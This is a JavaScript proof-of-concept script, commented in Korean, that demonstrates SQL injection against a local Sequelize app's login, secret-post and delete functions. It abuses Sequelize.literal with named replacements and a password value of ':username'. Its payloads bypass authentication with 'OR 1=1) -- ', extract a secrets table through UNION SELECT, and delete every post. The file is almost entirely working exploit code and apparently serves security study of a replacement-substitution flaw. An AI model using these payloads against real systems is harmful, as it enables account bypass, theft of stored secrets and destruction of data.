// poc.js
// 로그인 / 비밀글 조회 / 삭제, 이 3개 기능의 취약점을 여기서 한 번에 테스트함
// 실행: node poc.js (별도 서버 실행 불필요)
// server.js를 거치지 않고 models.js를 통해 DB에 직접 붙어서 테스트하는 구조

const { Sequelize, Op } = require('sequelize');
const { sequelize, User, Post } = require('./models');

async function main() {

  // ================= 기능1: 로그인 =================
  console.log('===== 로그인 테스트 =====');

// 정상 동작 확인: 잘못된 비밀번호로 로그인 시도 (실패해야 정상)
  let rows = await User.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`username = :username`),
        { password: 'wrongpw' },
      ],
    },
    replacements: { username: 'tae-hyun' },
  });
  console.log('정상케이스(비번틀림) -> 결과 ' + rows.length + '건 (0건이어야 정상)');

  // 여기서부터 실제 공격 시도.
  // username 자리에 OR 1=1, password 자리에 문자열 ":username"을 그대로 넣으면 인증을 우회할 수 있음
  // 발생 원리는 "2. POC 원리 자세한 설명"에서 별도로 다룸
  rows = await User.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`username = :username`),
        { password: ':username' },
      ],
    },
    replacements: { username: 'OR 1=1) -- ' },
  });
  console.log('공격케이스(인증우회) -> 결과 ' + rows.length + '건');
  console.log(rows.map((r) => ({ username: r.username, password: r.password }))); // id, 날짜 이런건 안중요해서 뺌

// 인증 우회에 성공한 김에, UNION Injection으로 secrets 테이블 데이터도 추출 가능한지 확인
// users 테이블 컬럼이 5개(id, username, password, createdAt, updatedAt)이므로 UNION SELECT도 컬럼 개수를 5개로 맞춰야 에러 없이 실행됨
  rows = await User.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`username = :username`),
        { password: ':username' },
      ],
    },
    replacements: {
      username: ') UNION SELECT id, label, value, createdAt, updatedAt FROM secrets -- ',
    },
  });
  console.log('공격케이스(secrets 테이블 탈취) -> 결과 ' + rows.length + '건');
  console.log(rows.map((r) => ({ username: r.username, password: r.password })));


  // ================= 기능2: 비밀글 조회 =================
  console.log('\n===== 비밀글 조회 테스트 =====');

  rows = await Post.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`title = :title`),
        { password: '틀린비번' },
      ],
    },
    replacements: { title: '개인 메모' },
  });
  console.log('정상케이스(비번틀림) -> 결과 ' + rows.length + '건 (0건이어야 정상)');

  rows = await Post.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`title = :title`),
        { password: ':title' },
      ],
    },
    replacements: { title: 'OR 1=1) -- ' },
  });
  console.log('공격케이스(비밀글 content 노출) -> 결과 ' + rows.length + '건');
  console.log(rows.map((r) => ({ title: r.title, isSecret: r.isSecret, content: r.content })));


  // ================= 기능3: 게시글 삭제 =================
  console.log('\n===== 삭제 테스트 =====');

  const beforeCount = await Post.count();
  console.log('삭제 전 게시글 수:', beforeCount);

// 정상 동작 확인: 제목은 맞고 비밀번호만 틀리게 삭제 시도 (삭제되지 않아야 정상)
  rows = await Post.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`title = :title`),
        { password: '아무비번' },
      ],
    },
    replacements: { title: '게시판 기능 정리' },
  });
  for (const row of rows) {
    await row.destroy();
  }
  const afterWrongCount = await Post.count();
  console.log('잘못된 비번으로 시도 후 게시글 수:', afterWrongCount, '(변화 없어야 정상)');

// 실제 공격 페이로드로 삭제 시도. 조회 로직 자체는 기능2와 완전히 동일하며 조건에 맞는 글을 찾은 뒤 destroy()만 추가로 붙임
  rows = await Post.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`title = :title`),
        { password: ':title' },
      ],
    },
    replacements: { title: 'OR 1=1) -- ' },
  });
  for (const row of rows) {
    await row.destroy();
  }
  const afterAttackCount = await Post.count();
  console.log('공격 후 게시글 수:', afterAttackCount, '(줄어들면 무단삭제 성공한거)');

  await sequelize.close();
}

main().catch((err) => {
  console.log('에러남', err);
  process.exit(1);
});
